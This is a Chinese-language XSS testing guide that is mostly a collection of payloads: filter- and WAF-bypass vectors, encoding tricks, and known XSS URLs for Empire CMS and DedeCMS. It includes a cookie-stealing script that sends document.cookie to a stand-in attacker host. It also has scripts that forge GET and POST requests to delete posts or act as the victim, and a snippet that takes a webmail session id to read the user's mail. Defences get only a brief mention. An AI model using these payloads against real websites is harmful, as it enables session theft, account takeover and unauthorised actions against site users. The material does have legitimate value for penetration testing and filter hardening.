# XSS 测试思路
XSS 是客户端脚本的头号大敌，随着JavaScript能力越来越大，xss的破坏力也越来越大。

无论是仅存于客户端的反射型xss或DOM型xss，还是存储在服务器上的存储型xss，都在随着JavaScript能力的增强而发生着更多的变化。

## 基础知识
### 注入位置

- 分页按钮
- 搜索框
- 其他输入框

总之，任何可以进行数据提交的点都是注入点。凡是可以将注入内容嵌入页面的都存在xss问题。在这些可提交位置创建可执行的xss payload，并使之被执行。
### 弹窗的三个函数
alert(7)
prompt(7)
confirm(7)

### Event handlers

onerror  错误
onload  加载
onclick  点击
onchange  域的内容被改变
onblur   元素失去焦点
onfocus   元素获得焦点
onmouseover  鼠标移到某元素之上
onmousemove  鼠标被移动
onmouseout  鼠标从某元素移开
onmousedown  鼠标按钮被按下
onreset   重置按钮被点击
onsubmit  确认按钮被点击
onselect  文本被选中
......


### 伪协议
#### JavaScript伪协议

示例：<a href="javascript:alert(7)">233</a>

说明：
- 值为url类型的标签属性均可使用javascript伪协议, 如：href，src，action等属性。
- JavaScript伪协议声明了URL的主体是任意的javascript代码
- 它由javascript的解释器执行，并将结果返回给当前的页面。

- a标签的href属性值为: alert(7), 页面加载时,由javascript解释器解析
- 当a标签被点击时, 会触发href属性, 解析的代码被执行


#### data伪协议
`data:text/html,<HTML代码>` 
`data:text/html;base64,<base64编码的HTML代码>`
`data:text/javascript,<Javascript代码>`  
`data:text/javascript;base64,<base64编码的Javascript代码>`  

### 编码

xss编码器：http://evuln.com/tools/xss-encoder/

|编码类型/示例字符	|<|s|
|-|-|-|
| html实体编码(10进制)| `&#60;`|	`&#115;`|
| html实体编码(16进制)| `&#x3C;`|	`&#x73;`|
| javascript编码(8进制)| `\74`	| `\163`|
| javascript编码(16进制)| `\x3c` | `\x73`|
| jsunicode编码 | `\u003c`|	`\u0073`|
| url编码| `%3C`| `%73`|
| base64编码| `PA==`	|`cw==`|

- 实体编码中<分号>是可以去掉的. 如 `&#115;` --> `&#115`
- 实体编码中可添加多个<0>.如 `&#x73;`  --> `&#x000000073;` (绕waf可能会用上)
- javascript编码(8进制) 较上述编码中, 相对简短.

#### JavaScript 编码和解码方法

JavaScript 定义了 6 个全局方法用于 Unicode 字符串的编码和解码，说明如表所示。

|方法|	说明|
|-|-|
|escape()	|使用转义序列替换某些字符来对字符串进行编码|
|unescape()|	对使用 escape() 编码的字符串进行解码|
|encodeURI()|	通过转义某些字符对 URI 进行编码|
|decodeURI()|	对使用 encodeURI() 方法编码的字符串进行解码|
|encodeURIComponent()|	通过某些转义字符对 URI 的组件进行编码|
|deencodeURIComponent()	|对使用 encodeURIComponent() 方法编码的字符串进行解码|


## 基本示例

`<script>alert("请移步");location.href="http://somehost.com"</script>`

`<script src="http://some-evil.com/xss.js"></script>`

`<img src="#" onerror=alert("xss")>`

`<img src="http://some-evil.com/xss.js" >`

`<img src="javascript:alert("xss")">`

### 获取cookie

- 简单cookie窃取示例：

```javascript
//http://some-evil.com/xss.js

var img=document.createElement("img");
img.src = "http://some-evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```
log 路径即便不存在，也不影响信息收集，因为cookie信息会记入到日志里，例如apache2/access.log中。

若在服务器响应中设置 `Set-Cookie=HttpOnly;`，上述js脚本就无法获取cookie。或者将cookie与客户端ip绑定，那么攻击者就不可能在其他地方使用此cookie或凭证。

### 构造 GET 请求

GET 和 POST请求基本上可以完成网站所有操作。如果有xss漏洞，那么恰当使用js功能即可从浏览器或客户端完成各种操作。

例如：删除某blog文章的操作url为: `http://blog.xx.com/manage/entry.do?m=delete&id=123`。此blog上存在xss漏洞。

攻击者可以构造下列payload：

```javascript
//http://some-evil.com/xss.js

var img=document.createElement("img");
img.src = "http://blog.xx.com/manage/entry.do?m=delete&id=123";
document.body.appendChild(img);
```

然后诱骗用户执行某个操作，使浏览器加载`<script src="http://some-evil.com/xss.js"></script>`  即可。

### 构造 POST 请求

攻击者可以构造下列发送POST请求的payload：

```javascript
//http://some-evil.com/xss.js

var dd=document.createElement("div");
document.body.appendChild(dd);
dd.innerHTML = '<form action="" method="post" id="xssform" name="mbform">' +
                '<input type="hidden" value="jj" name="ck" />' + 
                '<input type="text" value="test" name="mb_text" />' +
                '</form>'
document.getElementById("xxsform").submit();
```
或者使用XMLHttpRequest构造post：

```javascript
//http://some-evil.com/xss.js

var url="http://www.douban.com"
var postStr = "ck=jj&mb_text=test1234";
var ajax = null;
if(windows.XMLHttpRequest){
    ajax = new XMLHttpRequest();
}
else if(windows.ActiveXObject){
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
}
else{
    return;
}
ajax.open("POST",url,true);
ajax.setRequestHeader("Content-type","application/x-www-form-urlencoded");
ajax.send(postStr);
ajax.onreadystatechange = function(){
    if(ajax.readyState==4 && ajax.status==200){
        alert("Done.");
    }
}
```
上面这两个脚本，都可以发送POST请求。

攻击者通过构造这些请求，即便在无法获取cookie时，也可以直接操作用户浏览器执行某些动作。

但如果每个操作都需要用户输入验证码，或显示要求用户确认，这种隐蔽的攻击就会失效。但攻击者可以构造隐藏请求，将验证码等信息传递到远程服务器，然后再将内容回填到当前脚本，然后再利用已知的验证码发起请求。

#### 示例
例如：某个邮箱在用户登录后可以 `http://m57.mail.com/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=6adjkslekslfjDyssdf` 访问邮箱。其中的sid值可能是用户id的某种加密值。

攻击者可以构建XSS payload，获取sid值，使用XMLHttpRequest请求上述url，获取上述操做结果。
```javascript
if(top.window.location.href.indexOf("sid=")>0){
    var sid=top.window.location.href.substr(top.window.location.href.indexOf("sid=")+4,24);//24为密文长度
}

var url="http://" + top.window.location.host + "/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=" + sid;

var ajax = null;
if(windows.XMLHttpRequest){
    ajax = new XMLHttpRequest();
}
else if(windows.ActiveXObject){
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
}
else{
    return;
}
ajax.open("GET",url,true);
ajax.send(null);
ajax.onreadystatechange = function(){
    if(ajax.readyState==4 && ajax.status==200){
        alert(ajax.responseText);
        //document.write(ajax.responseText)
    }
}
```
上述代码执行成功后，可在alert弹窗中看到邮件内容。

### 识别浏览器

`<script>alert(navigator.userAgent);</script>`

### 识别用户安装的软件

浏览器安装的组件、扩展、插件都可以使用xss扫描出来。由此可以知道相关漏洞，植入木马。

- 在IE中可以判断ActiveX空间的classid是否存在，推测用户是否安装了某软件。

```js
try{
    var obj = new ActiveXObject('XunLeiBHO.ThunderIEHelper');
}catch(e){

}
```

- `<script>alert(navigator.plugins[0]);</script>`


## 绕过

下面是一些简单的测试用例。

注入下面代码，在大多数没有特殊xss向量要求而易遭受脚本攻击的地方将会弹出单词“xss”。使用url编码器去编码你的整个代码。

### 注入轻量的 “<任意字符>” 标签

然后判断输出点是否受到干扰就可以判断是否xss漏洞了。

```javascript
';alert(String.fromCharCode(88,83,83))//';
alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```
### 如果没有充足的输入空间
下面这段代码是一个好的简洁的xss注入检测代码。在注入这段代码后，查看页面源代码寻找是否存在看起来像 `<XSS verses <XSS`这样的输出。

`'';!--"<XSS>=&{()}`

### 无过滤
这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。

`<SCRIPT SRC=http://www.eee.eee/xss.js></SCRIPT>`
### 通过javascript指令实现的图片xss

图片xss依靠javascript指令实现。（IE7.0不支持javascript指令在图片上下文中，但是可以在其他上下文触发。下面的例子展示了一种其他标签依旧通用的原理。）

`<IMG SRC="javascript:alert('XSS');">`
### 无引号无分号

`<IMG SRC=javascript:alert('XSS')>`
### 不区分大小写的xss攻击向量

`<IMG SRC=JaVaScRiPt:alert('XSS')>`

### 重音符混淆
如果你的javascript代码中需要同时使用单引号和双引号，那么可以使用重音符（`）来包裹javascript代码。它也经常会非常有用因为xss过滤代码未考虑到这个字符。

`<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>`
### 畸形的A标签

跳过href属性，而直接获取xss实质攻击代码

`<a onmouseover="alert(document.cookie)">xxs link</a>`
此外，chrome浏览器喜欢去补全缺失的引号。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你补全缺失的引号在URL和script中。

`<a onmouseover=alert(document.cookie)>xxs link</a>`
### 畸形的IMG标签

这个xss向量依靠松散的渲染引擎解析IMG标签中被引号包含的字符串来实现。我猜测它最初是为了正确编码而这样实现，但这样让它更加困难去解析html。

`<IMG """><SCRIPT>alert("XSS")</SCRIPT>">`
### fromCharCode
 如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。

`<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`
### 巧用src属性去绕过SRC域名检测过滤器

使用onXX事件绕过src检查：
`<IMG SRC=# onmouseover="alert('xxs')">`

通过省略它的值绕过检查：
`<IMG SRC= onmouseover="alert('xxs')">`

通过完全不设置它绕过检查：
`<IMG onmouseover="alert('xxs')">`


通过error事件触发alert：
`<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`

### 十进制html编码引用
使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS Calculator 获取更多信息。

`<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`
#### 结尾没有分号的十进制html编码引用
它是经常有用的在绕过寻找”&#XX;”格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像`$tmp_string =~ s/.&#(\d+);./$1/;` 的过滤器,它们错误的认为一个html编码必须要用;去结束。

`<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`
#### 结尾没有分号的十六进制html编码引用
这也是一种实用的xss攻击针对上文的`$tmp_string =~ s/.&#(\d+);./$1/; `，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此）。使用 XSS Calculator 获取更多信息。

`<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`

### 使用TAB、换行、回车符改变代码形式

使用普通tab分开代码：`<IMG SRC="jav	ascript:alert('XSS');">`
使用编码的TAB分开xss攻击代码：`<IMG SRC="jav&#x09;ascript:alert('XSS');">`

- TAB 编码： `&#x09;`
- 换行符 编码：`&#x0A;`
- 回车符编码：`&#x0D;`


#### 推广至换行符，回车符
一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。

`<IMG SRC="jav&#x0A;ascript:alert('XSS');">`

`<IMG SRC="jav&#x0D;ascript:alert('XSS');">`

注意：上面我编写的三个xss字符串比必须长度的字符串更长，原因是0可以被省略。通常我看到的过滤器假设十六进制和十进制的编码是两到三个字符，正确的应该是一到七个字符。


### 没有分割的javascript指令

null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。

`perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out`
### IMG中javascript之前添加空格和元字符为xss绕过

xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。

`<IMG SRC=" &#14;  javascript:alert('XSS');">`
### 非字母数字字符的xss
Firefox html解析器认为一个非数字字母的字符在一个html关键字中不是有效的，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如，`<SCRIPT\s” != “<SCRIPT/XSS\s`

`<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>`

和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。借此我们可以绕过xss过滤器。注意这也是适用于重音符如下所示：

```
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```
Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不使用空格的情况下，Gecko仅允许一个斜杠在html标签和参数之间。这可能是有用的在那些不允许输入空格的系统中。

`<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>`
### 额外的开括号
Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。

`<<SCRIPT>alert("XSS");//<</SCRIPT>`
### 没关闭的script标签
对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”></SCRIPT>”这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。

`<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >`
### script标签中的协议解析
这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。

`<SCRIPT SRC=//ha.ckers.org/.j>`
### 半开的HTML/JavaScript xss向量
不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用”>”闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: `/((%3D)|(=))[^\n]*((%3C)|<)[^\n]+((%3E)|>)/` because it doesn’t require the end “>”. 它也是有效的去对付真实的xss过滤器，我曾经用半开的`<IFRAME` 标签替代 `<IMG` 标签去绕过过滤器。

`<IMG SRC="javascript:alert('XSS')"`
### 双开尖括号
使用一个开始尖括号(<)在向量结尾代替一个关闭尖括号（>）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。

`<iframe src=http://ha.ckers.org/scriptlet.html <`
### 转义javascript中的转义
当一个应用程序是输出用户自定义的信息到javascript代码中时，例如： `<SCRIPT>var a=”$ENV{QUERY_STRING}”;</SCRIPT>`。如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过再转义被转义的字符来绕过它。因此使最终的输入代码类似于`<SCRIPT>var a=”\”;alert(‘XSS’);//”;</SCRIPT>` 。最终`\`转义了双引号前被服务器添加的`\`，从而使双引号不会被转义，因此触发xss向量。xss定位器使用这个方法。

`\";alert('XSS');//`
### 闭合title标签

titile标签内部不支持html代码，所有内容会被自动转义为普通字符。

`</TITLE><SCRIPT>alert("XSS");</SCRIPT>`

### INPUT image##

`<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`

### BODY image

`<BODY BACKGROUND="javascript:alert('XSS')">`

### IMG DYNSRC(视频剪辑) 

`<IMG DYNSRC="javascript:alert('XSS')">`

### IMG lowsrc（低分辨率图片）

`<IMG LOWSRC="javascript:alert('XSS')">`
### List-style-image

`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`

### List-style-image

为符号列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为使用了javascript指令。这不是一个特别有用的xss向量。

`<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`

### VBscript in an image

`<IMG SRC='vbscript:msgbox("XSS")'>`
### Livescript 
仅适用于老版本的Netscape)

``<IMG SRC="livescript:[code]">``
### BODY 标签
这个方法不需要使用任何”javascript:” 或 “<SCRIPT…” 的变体去实现xss攻击。Dan Crowley特别指出你可以额外的加入一个空格在等号之前(“οnlοad=” != “onload =”):

`<BODY ONLOAD=alert('XSS')>`


### 圆括号被过滤
```
<svg/onload=alert`7`>
<img/src onerror=alert&lpar;2&rpar;>
<img/onerror="javascript:window.onerror=alert;throw 7"src>
```

### 弹窗函数被过滤
```
eval("\x61\x6c\x65\x72\x74\x28\x31\x29")
eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029")
eval(String.fromCharCode(97,108,101,114,116,40,55,41))
top['al'+'ert'](7)
self['al'+'ert'](7)
window['al'+'ert'](7)
```
### 关于autofocus自动触发on事件
`<input onfocus=alert(7) autofocus>`
- onfocus: 元素获得焦点
- autofocus: 自动获得焦点
两者结合便能够实现自动触发弹窗, 但需要注意的是, 它会陷入一个死循环, 无限弹窗.
  


### 关于location的各种变形绕过关键字过滤

location中的内容会进入JS语法部分, 所以这里支持字符串拼接, JS各种编码等操作, 在浏览器解析的时候, 会自动将这部分内容进行解码。

location本身可以进行实体编码, js编码:

```
<svg/onload=location='javascript:alert(7)'>
<svg/onload=location='jav'+'ascr'+'ipt:al'+'ert(7)'>
<svg/onload=location='j\x61v\u0061scrip\x74:alert`7`'>
<svg/onload=loc\u0061tion='jav'+'ascr'+'ipt:al'+'ert(7)'>
<svg/onload=loc&#x0000000000000061tion='jav'+'ascr'+'ipt:al'+'ert(7)'>
```

### 允许构造标签时的绕过

#### 敏感标签被过滤
onload, onerror, onfocus全部被过滤时，可以尝试：

```
<svg/onload=alert(7)>
<body/onload=alert(7)>
<img onerror=alert(7) src>
<video onerror=alert(7) src>
<audio onerror=alert(7) src>
<video><source onerror="javascript:alert(7)">
<input onfocus=alert(7) autofocus>
<select onfocus=alert(7) autofocus>  <!-- 测试仅火狐成功弹窗 -->
<keygen onfocus=alert(7) autofocus>  <!-- 测试仅火狐成功弹窗(被解析成select标签) -->
<textarea onfocus=alert(7) autofocus>  <!-- 测试仅火狐成功弹窗 -->
<marquee onstart=alert(7)>  <!-- 测试仅火狐成功弹窗 -->
```


#### 使用不常见的on事件
```
<body onpageshow=alert(7)>
<details ontoggle=alert(7) open>
<marquee onstart=alert(7)>  <!-- 测试仅火狐成功弹窗 -->
<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><input autofocus>  <!-- 测试仅google成功弹窗 -->
```

#### on事件全部被过滤时
```
<script src="https://xss.haozi.me/j.js"></script>
<iframe src=javascript:alert(7)>
<object data=javascript:alert(7)>  <!-- 测试仅火狐成功弹窗 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCg3KTwvc2NyaXB0Pg">
<object data="https://xss.haozi.me/j.js">
```

### 无法构造标签时

大多数时候, 尖括号会被过滤, 我们无法构造标签...但却能通过引号闭合某些标签中的属性值, 从而构造on事件属性, 实现XSS。

#### `<input>`标签内
正常能控制的是type属性
```
" onfocus=alert(7) autofocus x="
" onmouseover=alert(7) x="
" onmousemove=alert(7) x="
```

常见位置: 搜索框

#### `<a>`标签内
正常能控制的是href属性

##### 情况一: 只能控制href部分的输入

```
" onmouseover=alert(7) x="
" onmousemove=alert(7) x="
```

这里举个栗子:
- 原url: http://www.xxx.com/search.aspx
- 输入2333: http://www.xxx.com/search.aspx/2333
- 审查元素看到2333在`<a>`标签中被输出 `<a href="/search.aspx/2333?page=1" class="cur">1</a>`
- 输入payload: `http://www.xxx.com/search.aspx/2333" onmouseover=alert(7) x="`
- 再次审查元素查看 `<a href="/search.aspx/2333" onmouseover="alert(7)" x="?page=1" class="cur">1</a>`

实际中很少有这么顺利的, 往往闭合后还需要绕一些关键字.

##### 情况二: 能够控制整个href属性
这种情况就好多了, 首先不需要考虑闭合了, 直接使用JS伪协议.`javascript:alert(7)`

常见位置: 分页按钮

这种可以尝试在当前页面url后面进行闭合, 审查元素看看有没有变化


hidden属性的标签内：
`" accesskey=X onclick=alert(7) x="`

`" onmousemove=alert(7) type="`


这里举个栗子:
```
<!-- 原标签一 -->
<input type="hidden" value="">
<!-- type属性在输入位置前面, ALT+SHIFT+X快捷键触发(火狐) -->
<input type="hidden" value="aaa" accesskey="X" onclick="alert(7)" x="">
<!-- 原标签二 -->
<input value="" type="hidden">
<!-- type属性在输入位置后面,则可以重写一个type属性覆盖掉原有的type属性值,让标签显示出来 -->
<input value="aaa" onmousemove=alert(7) type="" type="hidden">
```

##### 补充一种很少见但实际遇到过的绕过WAF的情况
`<inputtype="hidden"value="aaa" abc accesskey="X"onclick="alert(7)"x="">`

这里穿插了一个abc无效属性绕过了WAF,不添加的话会直接被拦截, 网站无响应。在payload中穿插无效的属性, 可能会绕过WAF的正则匹配, 遇到被WAF拦截的情况时可以尝试下。



### XML_XSS
如果允许上传xml格式, 可将下面Payload保存为xml文件并上传, 访问即可触发弹窗. 

PS: ueditor编辑器默认是可以上传xml文件的, 大家遇到可以试下.

将如下payload保存为xml文件, 上传到服务器并访问即可触发弹窗
`<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(/xss/)</something:script>`


### 过滤器绕过
#### 大小写绕过
将原本的 `<script>alert(7)</script>` 进行大小写转换，例如：`<sCRiPt>alert(7)</sCrIpT>`

注意: JS严格区别大小写, HTML不区分大小写.
可以测试下 `<sCRiPt>alErt(7)</sCrIpT>` 行不行? 答案必然是否定的。


### 双写绕过

当两个字符以上被替换为空时，例如这里会将script关键字替换为空，然后剩下可用的部分：
`<scscriptript>alert(7)</scscriptript>`

又例如:select关键字被WAF拦截, 且网站有存在代码写的过滤器将script关键字替换为空，构造关键字:selscriptect 经过WAF,没有被识别; 经过过滤器,将script替换为空; 最后又变为select.

### 特殊字符混淆绕过

常用特殊字符:
- `&NewLine;` (H5新实体编码,表示回车)
- `&colon;` (H5新实体编码,表示冒号)
- `&lpar;` (左圆括号)
- `&rpar;` (右圆括号)
- `  (反引号可代替左右圆括号)
- `%0a` (回车)
- `%0d` (换行)
- `%09`
- `%0b`
- `%0c`

例如：

```
<iframe src=javascript:alert(7)>
<!--  -->
<iframe src=ja&NewLine;vasc&NewLine;ript&colon;alert&NewLine;&lpar;7&rpar;>
```

### 编解码绕过

几乎所有的Payload基本都可以通过编码或者js语法来变形, 但编码绕过的情况个人感觉也不是很多。

```
<details ontoggle=a=alert,a(7) open>
<input onmouseover='j&#97;v\u0061script:&#97;lert(7)'>
<input onmouseover=loc\u0061tion='j&#97;v\u0061s'+'cript:&#97;le'+'rt(7)'>
```
### HTML5新标签

#### video 标签

`<video src="http://someip/11.avi" onloadedmetadata="alert(document.cookie);" ondurationoncharged="alert(/xss2/);" ontimeupdate="alert(/xss3/);" tabindex="0"></video>`



## CMS通用XSS漏洞
### 帝国CMS
`/e/ViewImg/index.html?url=javascript:alert(7)`


### 织梦CMS
```
/dede/login.php?gotopage=%22%3E%3Ca%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(7);%3E
```


## 思路导图
分为：
- 发现
- 验证
- 利用
### 发现

#### trigger
##### origin
###### script context

使用 quot `的一些用例：
```javascript
alert`1`
`${alert(1)}`
\u{0000000000000061}lert(1)
setTimeout(name)

```





### 验证

### 利用